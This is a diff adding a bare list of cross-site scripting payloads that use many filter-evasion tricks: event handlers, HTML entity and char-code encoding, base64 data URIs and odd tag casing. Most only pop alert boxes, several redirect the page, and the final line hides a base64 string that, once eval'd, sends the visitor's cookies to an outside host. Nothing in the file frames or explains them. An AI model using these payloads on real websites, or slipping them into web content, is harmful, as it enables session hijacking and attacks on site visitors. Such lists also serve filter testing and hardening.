@@ -1,0 +1,47 @@
+<svg/onload=alert(1)> 
+<a onmouseover=alert(1)>x</a> 
+<div onmouseover='alert&lpar;1&rpar;'>DIV</div> 
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>"> 
+<IMAGE/onerror=alert(String.fromCharCode(88,83,83)) src=x> 
+ <IMAGE/onerror=alert(String.fromCharCode(88,83,83)) src=> 
+ <IMG SRC=# onerror=alert(1)> 
+ <IMG SRC=/ onerror=alert(String.fromCharCode(88,83,83))></img> 
+ <img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041"> 
+ <ImG sRc   =   /   onerrOr   =        alert(1)> 
+ <iMaGE sRc   =   /   onerrOr   =        alert(1)> 
+ <<SvG onloaD=        alert(1)//>> 
+ <svg/onmouseover=window.location=`http://google.de` width=1600 height=1600> 
+ <IMG/SRC=#&#x09; onerror=alert(1);&#x09;> 
+ <<SCRIPT>alert("XSS");//<</SCRIPT> 
+ <BODY ONLOAD=alert(1)> 
+ <IFRAME SRC=# onmouseover=alert(1)></IFRAME> 
+ <EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED> 
+ <IFRAME SRC=# onerror=alert(1)></IFRAME> 
+ <IFRAME SRC=# onload=alert(1)></IFRAME> 
+ <iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="alert(1)"> 
+ <var style="position:absolute;top:0;left:0;width:100%;height:100%" onmousemove=alert(1)></var>​ 
+ <script src="data:text/javascript,alert(1)"></script> 
+ <iframe/src \/\/onload = alert(1) 
+ http://www.<script>alert(1)</script .com 
+ <a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a 
+ <a style="position:absolute;width:100%;height:100%" onmousemove="this.click();" href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a> 
+ <svg><script>//&NewLine;alert(1);</script </svg> 
+ <script x> alert(1) </script 1=2 
+ <object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+></object>​ 
+ <audio src=1 href=1 onerror="alert&lpar;1&rpar;"></audio> 
+ <audio src=1 onerror=alert&lpar;1&rpar;></audio> 
+ <video src=1 onerror=alert&lpar;1&rpar;></video> 
+ <video/src ='1'onerror=alert&lpar;1&rpar;> 
+ <body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br> 
+ <video><source onerror="alert(1)"> 
+ <video><source onerror=alert&lpar;1&rpar;> 
+ <form><button style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover=this.click() formaction=javascript:alert(1)>x 
+ <a style="position:absolute;width:100%;height:100%" onmousemove="this.click();" &#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=alert&#40;1&#41;&#47;&#47;">XYZ</a 
+ <plaintext style=position:absolute;width:100%;height:100% onmouseover=alert&lpar;1&rpar; 
+ <object data=javascript:alert(1)>  
+ <isindex type=image src=# onerror=alert&lpar;1&rpar;> 
+ <isindex style=position:absolute;top:0;left:0;width:100%;height:100% onmouseover=this.click() action=javascript:alert&lpar;1&rpar; type=image> 
+ <img src=x:window.location=alt onerror=eval(src) alt=http://google.de> 
+ <a style=position&colon;absolute;width&colon;100&#37;;height&colon;100&#37; onmouseover=alert&lpar;1&rpar;>x</ <isindex id=d2luZG93LmxvY2F0aW9uPSdodHRwOi8vZnNvYzFldHkuZXN5LmVzL2luZGV4LnBocC8nK2RvY3VtZW50LmNvb2tpZQoK type=image autofocus onfocus=eval&lpar;atob&lpar;unescape&lpar;this.id&rpar;&rpar;&rpar;> 
+</body>
+</html>
